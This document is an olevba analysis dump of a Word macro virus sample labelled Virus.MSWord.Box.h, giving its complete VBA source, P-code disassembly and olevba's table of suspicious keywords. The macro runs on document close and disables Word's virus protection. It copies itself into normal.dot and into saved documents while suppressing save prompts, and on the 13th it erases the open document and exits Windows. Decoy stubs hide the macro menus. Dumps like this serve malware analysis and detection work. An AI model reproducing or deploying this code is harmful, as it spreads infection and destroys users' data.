olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Box.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Box.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoclose.bas 
in file: ./Virus.MSWord.Box.h - OLE stream: 'Macros/VBA/autoclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoclose()
Attribute autoclose.VB_Description = "巨集建立於 98/03/13，建立者 AAAA"
Attribute autoclose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoClose"

Dim F$
Dim N$
On Error Resume Next
Options.VirusProtection = False
For ADVVC = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(ADVVC).Name = "autoclose" Then
DocumentInstalled = True
End If
Next
For NTVVC = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(NTVVC).Name = "autoclose" Then
GlobalInstalled = True
End If
Next
If DocumentInstalled = True Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
activedoc.SaveAs FileName:=activedoc.Name, fileformat:=wdFormatTemplate
Options.SavePropertiesPrompt = False
End If
If GlobalInstalled = True Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If

On Error Resume Next
F$ = WordBasic.[FileName$]()
N$ = "normal.dot"
Application.OrganizerCopy Source:=F$, Destination:=N$, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
WordBasic.filesaveas Format:=1
F$ = WordBasic.[FileName$](0)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False

WordBasic.filesaveas Format:=1
F$ = WordBasic.[FileName$](1)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False

WordBasic.filesaveas Format:=1
F$ = WordBasic.[FileName$](2)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False

WordBasic.filesaveas Format:=1
F$ = WordBasic.[FileName$](3)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False

WordBasic.filesaveas Format:=1
F$ = WordBasic.[FileName$](4)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False


If WordBasic.Day(Now()) = 13 Then
joke
End If

exit_:

End Sub
Private Sub joke()
On Error Resume Next

    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    WordBasic.docclose 1
    WordBasic.ExitWindows

End Sub
Sub toolsoptions()

Rem
Rem

End Sub
Sub filetemplates()
Rem
Rem
End Sub
Sub toolsmacro()
Rem
Rem

End Sub
Sub viewvbcode()
Rem
Rem
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Box.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/autoclose - 8326 bytes
' Line #0:
' 	FuncDefn (Sub autoclose())
' Line #1:
' Line #2:
' 	Dim 
' 	VarDefn False
' Line #3:
' 	Dim 
' 	VarDefn N
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	StartForVariable 
' 	Ld ADVVC 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #7:
' 	Ld ADVVC 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "autoclose"
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitVarSpecial (True)
' 	St DocumentInstalled 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	StartForVariable 
' 	Next 
' Line #11:
' 	StartForVariable 
' 	Ld NTVVC 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #12:
' 	Ld NTVVC 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "autoclose"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitVarSpecial (True)
' 	St GlobalInstalled 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	StartForVariable 
' 	Next 
' Line #16:
' 	Ld DocumentInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #17:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "autoclose"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #18:
' 	Ld activedoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed fileformat 
' 	Ld activedoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld GlobalInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #22:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "autoclose"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St False$ 
' Line #28:
' 	LitStr 0x000A "normal.dot"
' 	St N$ 
' Line #29:
' 	Ld False$ 
' 	ParamNamed Source 
' 	Ld N$ 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "autoclose"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #30:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #31:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall filesaveas 0x0001 
' Line #32:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	St False$ 
' Line #33:
' 	Ld N$ 
' 	ParamNamed Source 
' 	Ld False$ 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "autoclose"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #34:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #35:
' Line #36:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall filesaveas 0x0001 
' Line #37:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	St False$ 
' Line #38:
' 	Ld N$ 
' 	ParamNamed Source 
' 	Ld False$ 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "autoclose"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #39:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #40:
' Line #41:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall filesaveas 0x0001 
' Line #42:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	St False$ 
' Line #43:
' 	Ld N$ 
' 	ParamNamed Source 
' 	Ld False$ 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "autoclose"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #44:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #45:
' Line #46:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall filesaveas 0x0001 
' Line #47:
' 	LitDI2 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	St False$ 
' Line #48:
' 	Ld N$ 
' 	ParamNamed Source 
' 	Ld False$ 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "autoclose"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #49:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #50:
' Line #51:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall filesaveas 0x0001 
' Line #52:
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	St False$ 
' Line #53:
' 	Ld N$ 
' 	ParamNamed Source 
' 	Ld False$ 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "autoclose"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #54:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #55:
' Line #56:
' Line #57:
' 	ArgsLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	IfBlock 
' Line #58:
' 	ArgsCall joke 0x0000 
' Line #59:
' 	EndIfBlock 
' Line #60:
' Line #61:
' 	Label exit_ 
' Line #62:
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Private Sub joke())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' Line #67:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #68:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0002 
' Line #69:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall docclose 0x0001 
' Line #70:
' 	Ld WordBasic 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #71:
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Sub toolsoptions())
' Line #74:
' Line #75:
' 	Rem 0x0000 ""
' Line #76:
' 	Rem 0x0000 ""
' Line #77:
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Sub filetemplates())
' Line #80:
' 	Rem 0x0000 ""
' Line #81:
' 	Rem 0x0000 ""
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Sub toolsmacro())
' Line #84:
' 	Rem 0x0000 ""
' Line #85:
' 	Rem 0x0000 ""
' Line #86:
' Line #87:
' 	EndSub 
' Line #88:
' 	FuncDefn (Sub viewvbcode())
' Line #89:
' 	Rem 0x0000 ""
' Line #90:
' 	Rem 0x0000 ""
' Line #91:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

